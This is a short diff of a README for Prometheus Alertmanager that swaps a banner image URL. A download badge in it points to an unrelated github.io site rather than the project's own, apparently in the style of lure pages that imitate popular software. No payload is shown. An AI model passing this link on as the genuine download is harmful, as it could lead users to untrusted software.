@@ -1,6 +1,6 @@
 # Prometheus Alertmanager - Alert Routing and Notification Management
 
-![Banner Placeholder](https://avatars.mds.yandex.net/i?id=6ee9e2de62188f5aaf5418ef367a5090bb71d9f9-12406511-images-thumbs&n=13)
+![Banner Placeholder](https://avatars.mds.yandex.net/i?id=731216f207e879a0ce89960652e2d264f87de41e-7543946-images-thumbs&n=13)
 
 [![GET Prometheus Alertmanager](https://img.shields.io/badge/GET%20%E2%80%94%20Prometheus%20Alertmanager-0078D6?style=for-the-badge&logoColor=white)](https://raid-health-diagnostic-suite.github.io/.github/prometheus-alertmanager)
 
